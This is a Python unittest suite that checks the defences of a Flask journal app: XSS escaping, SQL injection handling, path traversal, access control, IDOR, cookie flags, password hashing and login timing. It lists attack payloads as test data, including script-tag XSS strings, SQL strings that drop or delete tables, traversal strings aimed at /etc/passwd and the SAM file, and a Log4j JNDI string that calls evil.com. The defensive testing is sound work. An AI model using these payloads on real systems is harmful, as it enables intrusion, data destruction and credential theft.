import unittest
import json
import os
import tempfile
import sys
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app import app, register_user, verify_user

class TestSecurityVulnerabilities(unittest.TestCase):
    """Test suite for security vulnerabilities and attack vectors"""
    
    def setUp(self):
        """Set up test client and temporary files"""
        self.app = app
        self.app.config['TESTING'] = True
        self.app.config['SECRET_KEY'] = 'test-secret-key'
        self.app.config['WTF_CSRF_ENABLED'] = False
        self.client = self.app.test_client()
        
        # Create temporary files
        self.temp_journal = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json')
        self.temp_journal.write('[]')
        self.temp_journal.close()
        
        self.temp_users = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json')
        self.temp_users.write('{}')
        self.temp_users.close()
        
        # Override file paths
        import app as app_module
        self.original_journal_file = app_module.JOURNAL_FILE
        self.original_users_file = app_module.USERS_FILE
        app_module.JOURNAL_FILE = self.temp_journal.name
        app_module.USERS_FILE = self.temp_users.name
        
        # Create a test user
        register_user('testuser', 'password123')
        
    def tearDown(self):
        """Clean up temporary files"""
        import app as app_module
        app_module.JOURNAL_FILE = self.original_journal_file
        app_module.USERS_FILE = self.original_users_file
        os.unlink(self.temp_journal.name)
        os.unlink(self.temp_users.name)
    
    def login_user(self):
        """Helper to login test user"""
        return self.client.post('/journal_login', data={
            'username': 'testuser',
            'password': 'password123'
        })
    
    # XSS Prevention Tests
    def test_xss_prevention_in_journal_content(self):
        """Test that XSS payloads are properly escaped in journal content"""
        self.login_user()
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(`XSS`)">',
            '<input onfocus=alert("XSS") autofocus>'
        ]
        
        for payload in xss_payloads:
            # Add entry with XSS payload
            self.client.post('/journal', data={
                'focus': 'Daily Reflection',
                'content': payload,
                'mood': 'good',
                'energy': 'Medium',
                'tags': payload
            })
            
            # Check that payload is escaped in response
            response = self.client.get('/journal')
            self.assertNotIn(payload.encode(), response.data)
            # Check for escaped version
            self.assertIn(b'&lt;', response.data)
    
    def test_xss_prevention_in_tags(self):
        """Test XSS prevention in tag system"""
        self.login_user()
        
        malicious_tag = '<script>alert("tag-xss")</script>'
        self.client.post('/journal', data={
            'focus': 'Daily Reflection',
            'content': 'Test content',
            'mood': 'good',
            'energy': 'Medium',
            'tags': malicious_tag
        })
        
        response = self.client.get('/journal')
        self.assertNotIn(b'<script>alert("tag-xss")</script>', response.data)
    
    # SQL Injection Tests (though we use JSON, testing input handling)
    def test_sql_injection_prevention(self):
        """Test that SQL injection attempts are handled safely"""
        self.login_user()
        
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM journal_entries WHERE 1=1;",
            "' UNION SELECT * FROM users--"
        ]
        
        for payload in sql_payloads:
            response = self.client.post('/journal', data={
                'focus': payload,
                'content': payload,
                'mood': 'good',
                'energy': 'Medium'
            })
            
            # Verify the application doesn't crash and data is intact
            self.assertEqual(response.status_code, 302)  # Redirect after post
            
            # Check that payload is stored as-is (not executed)
            response = self.client.get('/journal')
            self.assertEqual(response.status_code, 200)
    
    # Path Traversal Tests
    def test_path_traversal_prevention(self):
        """Test that path traversal attacks are prevented"""
        path_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        for payload in path_payloads:
            # Try to access files outside allowed directories
            response = self.client.get(f'/download_ppt/{payload}')
            self.assertNotEqual(response.status_code, 200)
            self.assertIn(response.status_code, [302, 404])  # Redirect or not found
    
    # Authentication Bypass Tests
    def test_direct_journal_access_without_login(self):
        """Test that journal cannot be accessed without authentication"""
        response = self.client.get('/journal')
        self.assertEqual(response.status_code, 302)  # Should redirect to login
        
        response = self.client.get('/journal', follow_redirects=True)
        self.assertIn(b'Please log in to access your journal', response.data)
    
    def test_edit_entry_without_login(self):
        """Test that edit functionality requires authentication"""
        response = self.client.get('/journal/edit/1')
        self.assertEqual(response.status_code, 302)  # Should redirect
        
        response = self.client.post('/journal/edit/1', data={
            'content': 'Hacked content'
        })
        self.assertEqual(response.status_code, 302)
    
    def test_delete_entry_without_login(self):
        """Test that delete functionality requires authentication"""
        response = self.client.post('/journal/delete/1')
        self.assertEqual(response.status_code, 302)
    
    # Session Security Tests
    def test_session_fixation_prevention(self):
        """Test that session ID changes after login"""
        # Get initial session
        response = self.client.get('/')
        initial_cookies = response.headers.getlist('Set-Cookie')
        
        # Login
        response = self.client.post('/journal_login', data={
            'username': 'testuser',
            'password': 'password123'
        })
        
        # Session should be regenerated after login
        login_cookies = response.headers.getlist('Set-Cookie')
        # This is a simplified test - in production you'd check actual session IDs
        self.assertTrue(len(login_cookies) > 0)
    
    # IDOR (Insecure Direct Object Reference) Tests
    def test_cannot_access_other_users_entries(self):
        """Test that users cannot access other users' journal entries"""
        # Create two users and add entries
        register_user('user1', 'password1')
        register_user('user2', 'password2')
        
        # Login as user1 and create entry
        self.client.post('/journal_login', data={
            'username': 'user1',
            'password': 'password1'
        })
        
        self.client.post('/journal', data={
            'focus': 'Daily Reflection',
            'content': 'User1 private entry',
            'mood': 'good',
            'energy': 'High'
        })
        
        self.client.post('/logout_journal')
        
        # Login as user2
        self.client.post('/journal_login', data={
            'username': 'user2',
            'password': 'password2'
        })
        
        # Try to access user1's entry
        response = self.client.get('/journal/edit/1', follow_redirects=True)
        self.assertIn(b'Entry not found', response.data)
        
        # Try to delete user1's entry
        response = self.client.post('/journal/delete/1', follow_redirects=True)
        self.assertIn(b'Entry not found', response.data)
    
    # Input Validation Tests
    def test_max_input_length_handling(self):
        """Test that extremely long inputs are handled gracefully"""
        self.login_user()
        
        # Create very long input
        long_content = 'A' * 100000  # 100k characters
        
        response = self.client.post('/journal', data={
            'focus': 'Daily Reflection',
            'content': long_content,
            'mood': 'good',
            'energy': 'Medium'
        })
        
        # Should handle gracefully without crashing
        self.assertIn(response.status_code, [200, 302])
    
    def test_special_characters_handling(self):
        """Test that special characters are handled properly"""
        self.login_user()
        
        special_chars = [
            '\x00',  # Null byte
            '\r\n',  # CRLF
            '\\',    # Backslash
            '"',     # Quote
            "'",     # Single quote
            '<>',    # Angle brackets
            '${jndi:ldap://evil.com/a}',  # Log4j style payload
        ]
        
        for char in special_chars:
            response = self.client.post('/journal', data={
                'focus': 'Test',
                'content': f'Content with {char} character',
                'mood': 'good',
                'energy': 'Medium'
            })
            self.assertEqual(response.status_code, 302)
    
    # Password Security Tests
    def test_password_not_stored_in_plain_text(self):
        """Test that passwords are hashed, not stored in plain text"""
        import json
        
        # Read users file
        with open(self.temp_users.name, 'r') as f:
            users = json.load(f)
        
        # Check that password is not stored as plain text
        for username, user_data in users.items():
            self.assertNotIn('password123', str(user_data))
            self.assertIn('password_hash', user_data)
            # Check it's a properly hashed password (not plain text)
            # Werkzeug 2.x uses pbkdf2:sha256 by default
            self.assertTrue(user_data['password_hash'].startswith(('pbkdf2:', 'scrypt:', '$2b$')))
    
    def test_timing_attack_prevention(self):
        """Test that login timing doesn't reveal valid usernames"""
        import time
        
        # Time valid username with wrong password
        start = time.time()
        self.client.post('/journal_login', data={
            'username': 'testuser',
            'password': 'wrongpassword'
        })
        valid_user_time = time.time() - start
        
        # Time invalid username
        start = time.time()
        self.client.post('/journal_login', data={
            'username': 'nonexistentuser',
            'password': 'wrongpassword'
        })
        invalid_user_time = time.time() - start
        
        # Times should be similar (within 50ms)
        time_diff = abs(valid_user_time - invalid_user_time)
        self.assertLess(time_diff, 0.05)


class TestRememberMeSecurity(unittest.TestCase):
    """Test remember me token security"""
    
    def setUp(self):
        self.app = app
        self.app.config['TESTING'] = True
        self.app.config['SECRET_KEY'] = 'test-secret-key'
        self.client = self.app.test_client()
        
        # Set up temp files
        self.temp_users = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json')
        self.temp_users.write('{}')
        self.temp_users.close()
        
        import app as app_module
        self.original_users_file = app_module.USERS_FILE
        app_module.USERS_FILE = self.temp_users.name
        
        register_user('testuser', 'password123')
    
    def tearDown(self):
        import app as app_module
        app_module.USERS_FILE = self.original_users_file
        os.unlink(self.temp_users.name)
    
    def test_remember_token_is_httponly(self):
        """Test that remember token cookie has HttpOnly flag"""
        response = self.client.post('/journal_login', data={
            'username': 'testuser',
            'password': 'password123',
            'remember_me': '1'
        })
        
        cookies = response.headers.getlist('Set-Cookie')
        remember_cookie = next((c for c in cookies if 'remember_token=' in c), None)
        
        self.assertIsNotNone(remember_cookie)
        self.assertIn('HttpOnly', remember_cookie)
    
    def test_remember_token_has_secure_flag(self):
        """Test that remember token has Secure flag"""
        response = self.client.post('/journal_login', data={
            'username': 'testuser',
            'password': 'password123',
            'remember_me': '1'
        })
        
        cookies = response.headers.getlist('Set-Cookie')
        remember_cookie = next((c for c in cookies if 'remember_token=' in c), None)
        
        self.assertIsNotNone(remember_cookie)
        self.assertIn('Secure', remember_cookie)
    
    def test_remember_token_has_samesite(self):
        """Test that remember token has SameSite attribute"""
        response = self.client.post('/journal_login', data={
            'username': 'testuser',
            'password': 'password123',
            'remember_me': '1'
        })
        
        cookies = response.headers.getlist('Set-Cookie')
        remember_cookie = next((c for c in cookies if 'remember_token=' in c), None)
        
        self.assertIsNotNone(remember_cookie)
        self.assertIn('SameSite=Lax', remember_cookie)


if __name__ == '__main__':
    unittest.main() 